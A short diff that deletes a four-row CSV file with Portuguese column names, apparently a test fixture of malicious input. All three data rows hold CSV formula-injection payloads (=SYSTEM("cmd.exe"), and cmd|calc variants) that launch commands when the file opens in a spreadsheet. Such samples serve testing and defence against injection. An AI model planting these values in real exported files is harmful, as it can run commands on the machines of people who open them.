@@ -1,4 +1,0 @@
-nome,comando,valor
-User1,"=SYSTEM(""cmd.exe"")",1000
-User2,@sumproduct(1+9)*cmd|calc,2000
-User3,+2+5+cmd|calc,3000
